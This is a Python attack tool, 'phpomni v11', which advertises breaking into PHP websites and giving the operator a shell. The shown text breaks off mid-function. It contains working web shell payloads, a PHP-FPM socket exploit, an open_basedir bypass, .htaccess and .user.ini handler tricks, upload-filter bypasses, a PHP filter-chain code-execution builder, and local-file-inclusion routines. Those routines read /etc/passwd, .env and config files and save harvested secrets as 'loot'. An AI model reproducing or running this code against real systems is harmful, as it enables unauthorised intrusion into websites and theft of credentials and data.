#!/usr/bin/env python3
"""
phpomni v11 — find a way into a PHP site, then give you a shell.

Just run it and answer the questions:
    python3 phpomni.py

Non-interactive:
    python3 phpomni.py --pwn https://target/
    python3 phpomni.py -f sites.txt --pwn --threads 12 --json out.jsonl
"""
from __future__ import annotations

import argparse
import base64
import binascii
import http.client
import ipaddress
import json
import os
import random
import re
import socket
import ssl
import subprocess
import sys
import threading
import time
import traceback
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from enum import StrEnum
from uuid import uuid4

try:
    from rich.console import Console
    from rich.live import Live
    from rich.table import Table
    RICH = True
    CON = Console()
except ImportError:
    RICH = False
    CON = None

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")
WID = uuid4().hex[:6]
LFI_MARKER = f"PHPOMNI_{WID}_LFI"
LFI_END = f"PHPOMNI_{WID}_END"
SHELL_MARKER = f"PHPOMNI_{WID}_SHELL"
MAX_BODY = 1 << 20

BANNER = r"""
   __  __         __                            _
  / / / /__  ___ / /____ _  ___  ___ ___  (_)___
 / /_/ / _ \/ _ \/ __/  ' \/ _ \/ _ `/\ \/ / / __/
/ __  /  __/  __/ /_/_/_/_/\___/_//_//_/\_/_/\__/
\/  \/\___/\___/\__/            phpomni v11
"""

EXT_ORDER = [".php", ".php5", ".php7", ".php8", ".pht", ".phtm", ".phar", ".pgif", ".phps", ".shtml"]
NAME_SUFFIX = ["", ".", "%20", "%00.jpg", ".jpg"]
MIME_POLYGLOT = b"GIF89a;\n"

SHELL_DIRS = [
    "/uploads/", "/upload/", "/uploadfiles/", "/files/", "/file/", "/media/",
    "/images/", "/img/", "/assets/", "/static/", "/tmp/", "/temp/", "/data/",
    "/content/", "/storage/", "/public/", "/userfiles/", "/attachments/",
]

FALLBACK_WORDS = [
    "/index.php", "/upload.php", "/upload", "/api/upload", "/elfinder/php/connector.minimal.php",
    "/ckfinder/core/connector/php/connector.php", "/kcfinder/upload.php",
    "/ueditor/php/controller.php?action=config", "/adminer.php", "/filemanager/",
    "/wp-admin/admin-ajax.php", "/graphql", "/api/v1/upload", "/ajax/upload.php",
    "/filemanager/connectors/php/connector.php", "/info.php", "/phpinfo.php", "/test.php",
]

SCAN_SENSITIVE = [
    "/etc/passwd", "/etc/hosts", "/proc/self/cmdline", "/proc/self/environ",
    "/var/log/apache2/access.log", "/var/log/apache/access.log",
    "/var/log/httpd/access_log", "/var/log/nginx/access.log",
    "/usr/local/apache/log/access_log", "/var/log/apache2/error.log",
    "/usr/local/lsws/logs/access.log", "/var/log/lighttpd/access.log",
    "/etc/nginx/nginx.conf", "/etc/apache2/apache2.conf", "/etc/php.ini",
    "/etc/mysql/my.cnf", "/root/.bash_history", "C:/Windows/win.ini",
    "C:/xampp/apache/logs/access.log", "/var/www/html/index.php",
    "/var/www/html/.env", "/.env", "/config.php", "/wp-config.php",
    "/var/lib/php/sessions/sess_x", "/.git/config",
]
LFI_SEEDS = ["file", "page", "path", "inc", "include", "view", "doc", "p", "f", "tpl", "lang", "template", "cat"]
DEBUG_LEAK_PARAMS = ["phpinfo", "info", "debug", "test", "env", "diag"]

PHP_EXEC = ("<?php $m='" + SHELL_MARKER + "';if(empty($_REQUEST['c'])){echo $m;exit;}"
            "$c=base64_decode($_REQUEST['c']);"
            "$d=array_map('trim',explode(',',(string)ini_get('disable_functions')));"
            "$f=null;foreach(array('system','shell_exec','passthru','exec','popen') as $n)"
            "{if(function_exists($n)&&!in_array($n,$d)){$f=$n;break;}}"
            "if(!$f){echo 'NOFUNC';exit;}echo '=B=\\n';"
            "if($f==='system'||$f==='passthru'){$f($c);}"
            "elseif($f==='shell_exec'){echo $f($c);}"
            "elseif($f==='exec'){$o=array();$f($c,$o);echo implode(\"\\n\",$o);}"
            "else{$h=$f($c,'r');while(!feof($h)){echo fread($h,4096);}pclose($h);}"
            "echo \"\\n=E=\\n\";?>")

PHP_FPM = r"""<?php
$s=$_GET['s']??'127.0.0.1:9000';$f=$_GET['f']??__FILE__;$c=$_GET['c']??'id';
function r_($t,$d){return chr(1).chr($t).pack('n',1).pack('n',strlen($d)).chr(0).chr(0).$d;}
function nv($k,$v){$e=function($l){return $l<128?chr($l):pack('N',$l|0x80000000);};
 return $e(strlen($k)).$e(strlen($v)).$k.$v;}
$fp=strpos($s,'/')===0?@stream_socket_client("unix://$s",$en,$es,3)
  :@stream_socket_client("tcp://$s",$en,$es,3);
if(!$fp){echo "NOCONN $es";exit;}
$p=nv('GATEWAY_INTERFACE','CGI/1.1').nv('REQUEST_METHOD','GET').nv('SCRIPT_FILENAME',$f)
  .nv('SCRIPT_NAME','/x.php').nv('QUERY_STRING','').nv('REQUEST_URI','/x.php')
  .nv('SERVER_PROTOCOL','HTTP/1.1').nv('SERVER_SOFTWARE','phpomni');
$b='<?php system('.var_export($c,true).');?>';
fwrite($fp,r_(1,pack('n',1).chr(1).str_repeat(chr(0),5)));
fwrite($fp,r_(4,$p.chr(0).chr(0)));
fwrite($fp,r_(5,$b));fwrite($fp,r_(5,''));
stream_set_timeout($fp,6);$o='';
while(!feof($fp)){$x=fread($fp,8192);if($x===false)break;$o.=$x;if(strlen($o)>200000)break;}
echo $o;?>"""

PHP_GLOB = r"""<?php
$t=$_GET['t']??'/';$c=$_GET['c']??'id';$it=@opendir('glob://'.$t.'*');$h=array();
if($it){while(($n=readdir($it))!==false){if($n!=='.'&&$n!=='..')$h[]=$n;}closedir($it);}
echo "GLOB:".implode('|',$h)."\n";
foreach(array('/','/tmp','/var/www','/var/www/html','/home','/opt','/srv') as $d){
 if(@chdir($d)){@ini_set('open_basedir',$d);$o=@shell_exec($c);if($o){echo "AT $d\n$o";break;}}}?>"""

HTACCESS_VARIANTS = (
    b'<FilesMatch "\\.phpomni$">\nSetHandler application/x-httpd-php\n</FilesMatch>\n',
    b"AddType application/x-httpd-php .phpomni\n",
    b"AddHandler application/x-httpd-php .phpomni\n",
    b"AddType application/x-httpd-php .lol\nAddHandler application/x-httpd-php .lol\n",
)
USERINI_VARIANTS = (b"auto_prepend_file=phpomni.php\n", b"auto_append_file=phpomni.php\n")
INTERESTING_KEYS = ("db_pass", "dbpass", "password", "secret", "api_key", "apikey", "token", "app_key", "private")

MULLVAD_NETS = [ipaddress.ip_network(n) for n in (
    "185.65.132.0/22", "185.65.134.0/23", "193.138.218.0/24", "45.83.220.0/22",
    "141.98.252.0/22", "194.242.56.0/22", "146.70.0.0/16", "138.199.0.0/16",
    "169.150.0.0/16", "31.171.0.0/16",
)]

COLOR = False
QUIET = False
LOOT = ""


def _c(txt: str, code: str) -> str:
    return f"\033[{code}m{txt}\033[0m" if COLOR else txt


def say(msg: str = "") -> None:
    if QUIET:
        return
    if RICH:
        CON.print(msg, markup=False, highlight=False)
    else:
        print(msg, flush=True)


def ok(m: str) -> None:
    say(_c("[+] ", "32") + m)


def warn(m: str) -> None:
    say(_c("[!] ", "33") + m)


def bad(m: str) -> None:
    say(_c("[x] ", "31") + m)


def inf(m: str) -> None:
    say(_c("[*] ", "36") + m)


def save_loot(t: "Target", name: str, data: bytes | str) -> None:
    if not LOOT:
        return
    try:
        d = os.path.join(LOOT, re.sub(r"[^\w.\-]", "_", t.host_header()))
        os.makedirs(d, exist_ok=True)
        p = os.path.join(d, re.sub(r"[^\w.\-]", "_", name)[:120] or "file")
        with open(p, "wb") as fh:
            fh.write(data if isinstance(data, bytes) else data.encode())
    except OSError:
        pass


class K(StrEnum):
    LEAK = "LEAK"
    EXEC = "EXEC"
    SHELL = "SHELL"
    FAIL = "FAIL"


@dataclass
class Finding:
    kind: K
    prong: str
    detail: str
    hard: bool = False


@dataclass
class Profile:
    os: str = "unknown"
    sapi: str = "unknown"
    php: str = ""
    open_basedir: str = ""
    disable_functions: str = ""
    allow_url_include: bool = False
    allow_url_fopen: bool = True
    file_uploads: bool = True
    session_progress: bool = True
    session_cleanup: bool = True
    serialize_handler: str = "php"
    save_path: str = ""
    docroot: str = ""
    leaks: list[str] = field(default_factory=list)


def split_headers(raw: bytes):
    for sep in (b"\r\n\r\n", b"\n\n"):
        if sep in raw:
            head, _, body = raw.partition(sep)
            break
    else:
        head, body = raw, b""
    lines = head.replace(b"\r\n", b"\n").split(b"\n")
    status = 0
    if lines and lines[0].startswith(b"HTTP/"):
        try:
            status = int(lines[0].split()[1])
        except (IndexError, ValueError):
            status = 0
        lines = lines[1:]
    hdr: dict[str, str] = {}
    for ln in lines:
        if b":" not in ln:
            continue
        k, _, v = ln.partition(b":")
        hdr[k.decode("latin1").strip().lower()] = v.decode("latin1").strip()
    return status, hdr, body


def read_response(sock: socket.socket, cap: int = MAX_BODY) -> bytes:
    head = b""
    while b"\r\n\r\n" not in head and b"\n\n" not in head and len(head) < (1 << 16):
        chunk = sock.recv(4096)
        if not chunk:
            return head
        head += chunk
    sep = b"\r\n\r\n" if b"\r\n\r\n" in head else b"\n\n"
    head, _, rest = head.partition(sep)
    raw_head = head + sep
    _, headers, _ = split_headers(raw_head)
    body = bytearray(rest)
    if "chunked" in headers.get("transfer-encoding", "").lower():
        while True:
            while b"\r\n" not in body:
                chunk = sock.recv(4096)
                if not chunk:
                    return raw_head + bytes(body)
                body += chunk
            line, _, tail = bytes(body).partition(b"\r\n")
            try:
                size = int(line.split(b";")[0], 16)
            except ValueError:
                return raw_head + bytes(body)
            body = bytearray(tail)
            while len(body) < size + 2:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                body += chunk
            del body[: size + 2]
            if size == 0 or len(body) > cap:
                break
    else:
        clen = headers.get("content-length", "")
        limit = min(int(clen), cap) if clen.isdigit() else cap
        while len(body) < limit:
            chunk = sock.recv(65536)
            if not chunk:
                break
            body += chunk
    return raw_head + bytes(body)


@dataclass
class Response:
    status: int
    headers: dict[str, str]
    body: bytes

    @property
    def text(self) -> str:
        return self.body.decode("latin1", "replace")

    @property
    def ok(self) -> bool:
        return 200 <= self.status < 400

    @property
    def ctype(self) -> str:
        return self.headers.get("content-type", "").lower()


class Target:
    def __init__(self, url: str, *, lhost: str = "", lport: int = 0, timeout: float = 8.0,
                 delay: tuple[float, float] = (0.05, 0.25), retries: int = 1,
                 headers: dict[str, str] | None = None, cookie: str = "",
                 auth: tuple[str, str] | None = None, proxy: str = "",
                 strict_ssl: bool = False):
        p = urllib.parse.urlsplit(url if "//" in url else "http://" + url)
        self.scheme = p.scheme if p.scheme in ("http", "https") else "http"
        self.host = p.hostname or ""
        self.port = p.port or (443 if self.scheme == "https" else 80)
        self.base = p.path or "/"
        if p.query:
            self.base += "?" + p.query
        self.tls = self.scheme == "https"
        self.lhost, self.lport = lhost, lport
        self.timeout, self.delay, self.retries = timeout, delay, retries
        self.headers = dict(headers or {})
        self.cookies: dict[str, str] = {}
        for part in cookie.split(";"):
            if "=" in part:
                k, _, v = part.partition("=")
                self.cookies[k.strip()] = v.strip()
        self.auth = auth
        self.proxy = urllib.parse.urlsplit(proxy) if proxy else None
        self.strict_ssl = strict_ssl
        self.profile = Profile()
        self.findings: list[Finding] = []
        self.handler: dict | None = None
        self.route: tuple[str, str] | None = None
        self.shell_url = ""
        self.sid = uuid4().hex
        self.ext_ok = ""
        self.writable = ""
        self._lock = threading.Lock()

    def _wrap(self, s: socket.socket) -> socket.socket:
        if not self.tls:
            return s
        ctx = ssl.create_default_context()
        if self.strict_ssl:
            ctx.check_hostname = True
            ctx.verify_mode = ssl.CERT_REQUIRED
        else:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(s, server_hostname=self.host)

    def _connect(self) -> socket.socket:
        if self.proxy:
            return self._connect_proxy()
        return self._wrap(socket.create_connection((self.host, self.port), timeout=self.timeout))

    def _connect_proxy(self) -> socket.socket:
        p = self.proxy
        if p.scheme.startswith("socks"):
            try:
                import socks
            except ImportError:
                raise OSError("PySocks required for socks proxy") from None
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, p.hostname, p.port or 1080)
            s.settimeout(self.timeout)
            s.connect((self.host, self.port))
            return self._wrap(s)
        s = socket.create_connection((p.hostname, p.port or 8080), timeout=self.timeout)
        if self.tls:
            s.sendall(f"CONNECT {self.host}:{self.port} HTTP/1.1\r\n"
                      f"Host: {self.host}:{self.port}\r\n\r\n".encode())
            head = b""
            while b"\r\n\r\n" not in head:
                b = s.recv(4096)
                if not b:
                    raise OSError("proxy CONNECT closed")
                head += b
            if b" 200 " not in head.split(b"\r\n")[0]:
                raise OSError(f"proxy CONNECT failed: {head[:80]!r}")
        return self._wrap(s)

    def host_header(self) -> str:
        h = f"[{self.host}]" if ":" in self.host else self.host
        return h if self.port in (80, 443) else f"{h}:{self.port}"

    def url(self, path: str) -> str:
        return f"{self.scheme}://{self.host_header()}{path}"

    def raw_request(self, method: str, path: str, body: bytes | None = None,
                    extra: dict[str, str] | None = None, read_cap: int = MAX_BODY) -> Response:
        if self.delay[1] > 0:
            time.sleep(random.uniform(*self.delay))
        last: Exception | None = None
        for attempt in range(self.retries + 1):
            try:
                return self._once(method, path, body, extra, read_cap)
            except (OSError, ssl.SSLError) as exc:
                last = exc
                if attempt < self.retries:
                    time.sleep(0.3 * (attempt + 1))
        raise last or OSError("request failed")

    def _once(self, method, path, body, extra, read_cap) -> Response:
        if not path.startswith("/") and "://" not in path:
            path = "/" + path
        wire = f"{self.scheme}://{self.host_header()}{path}" if (self.proxy and not self.tls) else path
        hdrs = {"Host": self.host_header(), "User-Agent": UA, "Accept": "*/*",
                "Accept-Encoding": "identity", "Connection": "close"}
        hdrs.update(self.headers)
        if extra:
            hdrs.update(extra)
        if self.cookies:
            hdrs["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
        if self.auth:
            tok = base64.b64encode(f"{self.auth[0]}:{self.auth[1]}".encode()).decode()
            hdrs["Authorization"] = f"Basic {tok}"
        if body is not None:
            hdrs["Content-Length"] = str(len(body))
            hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")
        packet = ("\r\n".join([f"{method} {wire} HTTP/1.1"] + [f"{k}: {v}" for k, v in hdrs.items()])
                  + "\r\n\r\n").encode("latin1") + (body or b"")
        sock = self._connect()
        try:
            sock.sendall(packet)
            raw = read_response(sock, read_cap)
        finally:
            try:
                sock.close()
            except OSError:
                pass
        st, hdr, bd = split_headers(raw)
        for k, v in hdr.items():
            if k == "set-cookie":
                ck, _, rest = v.partition("=")
                self.cookies[ck.strip()] = rest.split(";")[0]
        return Response(st, hdr, bd)

    def get(self, path: str, read_cap: int = MAX_BODY) -> Response:
        return self.raw_request("GET", path, read_cap=read_cap)

    def post(self, body: bytes, ctype: str = "application/x-www-form-urlencoded",
             path: str | None = None, read_cap: int = MAX_BODY) -> Response:
        return self.raw_request("POST", path or self.base, body, {"Content-Type": ctype}, read_cap)

    def get2(self, path: str, read_cap: int = MAX_BODY, follow: int = 3) -> Response:
        r = Response(0, {}, b"")
        for _ in range(follow + 1):
            r = self.get(path, read_cap)
            loc = r.headers.get("location")
            if follow and r.status in (301, 302, 303, 307, 308) and loc:
                sp = urllib.parse.urlsplit(loc)
                if sp.hostname in (None, self.host):
                    path = (sp.path or path) + (("?" + sp.query) if sp.query else "")
                    follow -= 1
                    continue
            break
        return r

    def note(self, f: Finding) -> None:
        with self._lock:
            self.findings.append(f)
            if f.hard and not self.ext_ok:
                self.ext_ok = f.prong

    @property
    def hard(self) -> bool:
        return any(f.hard for f in self.findings)


def build_multipart(fields: list[tuple], boundary: bytes) -> bytes:
    out = bytearray()
    for f in fields:
        out += b"--" + boundary + b"\r\n"
        if len(f) == 2:
            val = f[1] if isinstance(f[1], bytes) else str(f[1]).encode()
            out += f'Content-Disposition: form-data; name="{f[0]}"\r\n\r\n'.encode()
            out += val + b"\r\n"
        else:
            _, fname, data, ctype = f
            out += (f'Content-Disposition: form-data; name="{f[0]}"; filename="{fname}"\r\n'
                    f'Content-Type: {ctype}\r\n\r\n').encode()
            out += data + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def q(s: str, safe: str = "") -> str:
    return urllib.parse.quote(s, safe=safe)


def proof_body(text: str, start: str, end: str) -> str:
    if start not in text:
        return ""
    tail = text.split(start, 1)[1]
    if end in tail:
        tail = tail.split(end, 1)[0]
    return tail.strip()[:4000]


_PFX = {
    "0": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "1": ("ISO88597.UTF8", "UTF8.CSISO2022KR"),
    "2": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "3": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "4": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "5": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "6": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "7": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "8": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "9": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "A": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "B": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "C": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "D": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "E": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "F": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "G": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "H": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "I": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "J": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "K": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "L": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "M": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "N": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "O": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "P": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "Q": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "R": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "S": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "T": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "U": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "V": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "W": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "X": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "Y": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "Z": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "a": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "b": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "c": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "d": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "e": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "f": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "g": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "h": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "i": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "j": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "k": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "l": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "m": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "n": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "o": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "p": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "q": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "r": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "s": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "t": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "u": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "v": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "w": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "x": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "y": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "z": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "+": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"), "/": ("ISO8859-1.UTF8", "UTF8.CSISO2022KR"),
    "=": ("UTF8.UTF16LE", "UTF8.CSISO2022KR"),
}
_TAIL = "convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2"


def build_chain(php: str) -> str:
    payload = base64.b64encode(php.encode()).decode()
    parts = ["convert.iconv.UTF8.CSISO2022KR", "convert.base64-encode", "convert.iconv.UTF8.UTF7"]
    for ch in reversed(payload):
        pre = _PFX.get(ch)
        if not pre:
            raise KeyError(ch)
        parts += [f"convert.iconv.{pre[0]}.{pre[1]}", _TAIL,
                  "convert.base64-decode", "convert.base64-encode", "convert.iconv.UTF8.UTF7"]
    parts.append("convert.base64-decode")
    return "php://filter/" + "|".join(parts) + "/resource="


def detect_os(t: Target, body: str) -> None:
    blob = body.lower()
    if any(s in blob for s in ("c:/windows", "win32", "microsoft-iis", "xampp", "wamp")):
        t.profile.os = "windows"
    elif any(s in blob for s in ("/var/www", "/etc/passwd", "ubuntu", "debian", "apache/2")):
        t.profile.os = "unix"


def detect_sapi(t: Target, hdr: dict[str, str]) -> None:
    server = (hdr.get("server", "") + " " + hdr.get("x-powered-by", "")).lower()
    for token, sapi in (("iis", "iis"), ("fpm", "fpm"), ("fastcgi", "fpm"), ("cgi", "cgi"),
                        ("litespeed", "apache"), ("apache", "apache"), ("nginx", "nginx")):
        if token in server:
            t.profile.sapi = sapi
            break
    m = re.search(r"php/(\d+\.\d+(?:\.\d+)?)", server)
    if m:
        t.profile.php = m.group(1)


FORM_RE = re.compile(rb"<form[^>]*>(.*?)</form>", re.S | re.I)
INPUT_RE = re.compile(rb"<input[^>]+>", re.I)
ATTR_RE = re.compile(rb"""([\w:-]+)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>"']+))""", re.I)
ACTION_HINTS = ("upload", "submit", "save", "import", "attach", "add")


def _attrs(tag: bytes) -> dict[bytes, bytes]:
    out: dict[bytes, bytes] = {}
    for m in ATTR_RE.finditer(tag):
        out[m.group(1).lower()] = next((g for g in m.groups()[1:] if g is not None), b"")
    return out


def parse_upload_forms(base: str, body: bytes) -> list[dict]:
    out = []
    for fm in FORM_RE.finditer(body):
        blob = fm.group(1)
        file_inputs = [i for i in INPUT_RE.finditer(blob)
                       if _attrs(i.group(0)).get(b"type", b"").lower() == b"file"]
        if not file_inputs:
            continue
        field = _attrs(file_inputs[0].group(0)).get(b"name", b"").decode("latin1")
        if not field:
            continue
        action = _attrs(fm.group(0).split(b">", 1)[0]).get(b"action", b"").decode("latin1")
        extra = {}
        for inp in INPUT_RE.finditer(blob):
            a = _attrs(inp.group(0))
            nm = a.get(b"name", b"").decode("latin1")
            if nm and nm != field and a.get(b"type", b"text").lower() in (b"hidden", b"text"):
                extra[nm] = a.get(b"value", b"").decode("latin1")
        sp = urllib.parse.urlsplit(urllib.parse.urljoin(base, action) if action else base)
        out.append({"path": sp.path + (("?" + sp.query) if sp.query else ""),
                    "field": field, "extra": extra})
    return out


def discover_upload_handlers(t: Target, words: list[str]) -> list[dict]:
    found: list[dict] = []
    for w in words:
        try:
            r = t.get(w if w.startswith("/") else "/" + w, read_cap=200_000)
        except OSError:
            continue
        if r.status not in (200, 302):
            continue
        forms = parse_upload_forms(t.base, r.body)
        if forms:
            for f in forms:
                f["source"] = "form"
                found.append(f)
        elif any(h in w.lower() for h in ACTION_HINTS) and "html" in r.ctype:
            found.append({"path": w, "field": "file", "extra": {}, "source": "guess"})
    return found


def parse_ini(t: Target, txt: str) -> None:
    def grab(key: str) -> str:
        m = re.search(rf">{re.escape(key)}</td><td[^>]*>(.*?)</td>", txt, re.S | re.I)
        return re.sub(r"<[^>]+>", "", m.group(1)).strip() if m else ""

    p = t.profile
    p.open_basedir = grab("open_basedir")
    p.disable_functions = grab("disable_functions")
    p.allow_url_include = grab("allow_url_include").lower() in ("on", "1")
    if grab("allow_url_fopen"):
        p.allow_url_fopen = grab("allow_url_fopen").lower() not in ("off", "0")
    if grab("file_uploads"):
        p.file_uploads = grab("file_uploads").lower() not in ("off", "0")
    if grab("session.upload_progress.enabled"):
        p.session_progress = grab("session.upload_progress.enabled").lower() not in ("off", "0")
    if grab("session.upload_progress.cleanup"):
        p.session_cleanup = grab("session.upload_progress.cleanup").lower() not in ("off", "0")
    p.serialize_handler = grab("session.serialize_handler") or "php"
    p.save_path = grab("session.save_path").split(";")[-1].strip()
    p.docroot = grab("DOCUMENT_ROOT")
    if p.disable_functions:
        t.note(Finding(K.LEAK, "phpinfo", f"disable_functions={p.disable_functions[:120]}"))
    if p.open_basedir:
        t.note(Finding(K.LEAK, "phpinfo", f"open_basedir={p.open_basedir}"))


def harvest_leaks(t: Target) -> None:
    seen: set[str] = set()
    for p in [t.base] + [f"{t.base.rstrip('/')}/{d}" for d in DEBUG_LEAK_PARAMS]:
        if p in seen:
            continue
        seen.add(p)
        try:
            r = t.get(p, read_cap=400_000)
        except OSError:
            continue
        if r.ok and ("phpinfo()" in r.text or "PHP Version" in r.text):
            t.note(Finding(K.LEAK, "phpinfo", p))
            t.profile.leaks.append(p)
            save_loot(t, "phpinfo.html", r.body)
            parse_ini(t, r.text)
            break
    for p in ("/.env", "/.git/config", "/composer.json"):
        try:
            r = t.get(p, read_cap=200_000)
        except OSError:
            continue
        if r.status == 200 and len(r.body) > 20:
            t.note(Finding(K.LEAK, "file", p))
            t.profile.leaks.append(p)
            save_loot(t, p.strip("/").replace("/", "_"), r.body)
            if p == "/.env":
                for line in r.text.splitlines():
                    if "=" in line and not line.startswith("#"):
                        k, _, v = line.partition("=")
                        if any(i in k.lower() for i in INTERESTING_KEYS) and len(v) > 3:
                            t.note(Finding(K.LEAK, "env", f"{k.strip()}={v.strip()[:60]}"))


def session_paths(t: Target) -> list[str]:
    out = ([t.profile.save_path.rstrip("/") + "/"] if t.profile.save_path else [])
    out += ["/var/lib/php/sessions/", "/var/lib/php5/", "/var/lib/php7/", "/tmp/", "C:/Windows/Temp/"]
    return list(dict.fromkeys(out))


def lfi_read(t: Target, route: tuple[str, str], rel: str) -> bytes | None:
    page, param = route
    for wrap in (f"php://filter/convert.base64-encode/resource={rel}",
                 f"php://filter/read=convert.base64-encode/resource={rel}"):
        for v in (q(wrap), q(wrap, "/:.")):
            try:
                r = t.get2(f"{page}?{param}={v}", read_cap=600_000)
            except OSError:
                continue
            m = re.search(r"[A-Za-z0-9+/=\s]{64,}", r.text)
            if not m:
                continue
            blob = re.sub(r"\s+", "", m.group(0))
            try:
                dec = base64.b64decode(blob[: len(blob) // 4 * 4], validate=False)
            except binascii.Error:
                continue
            if len(dec) > 20:
                return dec
    return None


def discover_lfi_route(t: Target) -> tuple[str, str] | None:
    pages = [t.base] + [f"{t.base.rstrip('/')}/{p}" for p in ("index.php", "?page=home")]
    for page in pages:
        if "?" in page:
            pg, _, qs = page.partition("?")
            params = [kv.split("=")[0] for kv in qs.split("&")]
        else:
            pg, params = page, LFI_SEEDS
        for param in params:
            for depth in (1, 3, 5):
                trav = "../" * depth
                for cand in (f"{trav}etc/passwd", "/etc/passwd", f"{trav}windows/win.ini"):
                    try:
                        r = t.get2(f"{pg}?{param}={q(cand)}", read_cap=60_000)
                    except OSError:
                        continue
                    if "root:x:0:0" in r.text or "[fonts]" in r.text:
                        return (pg, param)
    return None


def lfi_prong(t: Target, cmd: str) -> None:
    route = discover_lfi_route(t)
    if not route:
        t.note(Finding(K.FAIL, "lfi", "no traversal route"))
        return
    t.route = route
    page, param = route
    t.note(Finding(K.LEAK, "lfi", f"route {page}?{param}"))
    ok(f"{t.host_header()} reads files at {page}?{param}")

    for rel in ("index.php", "config.php", "../index.php"):
        src = lfi_read(t, route, rel)
        if src:
            t.note(Finding(K.LEAK, "lfi", f"source read {rel} ({len(src)}b)"))
            save_loot(t, "source_" + re.sub(r"[^\w]", "_", rel) + ".txt", src)
            break
    for cand in SCAN_SENSITIVE:
        try:
            r = t.get2(f"{page}?{param}={q(cand)}", read_cap=120_000)
        except OSError:
            continue
        if "root:x:0:0" in r.text:
            t.note(Finding(K.LEAK, "lfi", f"read {cand}"))
            save_loot(t, cand.strip("/").replace("/", "_"), r.body)
            break

    body = f"<?php echo '{LFI_MARKER}';system('{cmd}');echo '{LFI_END}';?>"
    b64cmd = base64.b64encode(cmd.encode()).decode()
    if t.profile.allow_url_include:
        for v in (f"data://text/plain;base64,{base64.b64encode(body.encode()).decode()}",
                  f"data://text/plain,{q(body)}"):
            try:
                r = t.get2(f"{page}?{param}={q(v, '/:.=+,;')}", read_cap=120_000)
            except OSError:
                continue
            if LFI_MARKER in r.text:
                t.note(Finding(K.EXEC, "lfi:data", proof_body(r.text, LFI_MARKER, LFI_END) or "marker",
                               hard=True))
                ok(f"{t.host_header()} runs code via data://")
                return

    try:
        chain = build_chain(f"<?php echo '{LFI_MARKER}';system(base64_decode('{b64cmd}'));"
                            f"echo '{LFI_END}';?>")
    except KeyError:
        chain = ""
    for v in ([q(chain), q(chain, "/:.")] if chain else []):
        try:
            r = t.get2(f"{page}?{param}={v}", read_cap=200_000)
        except OSError:
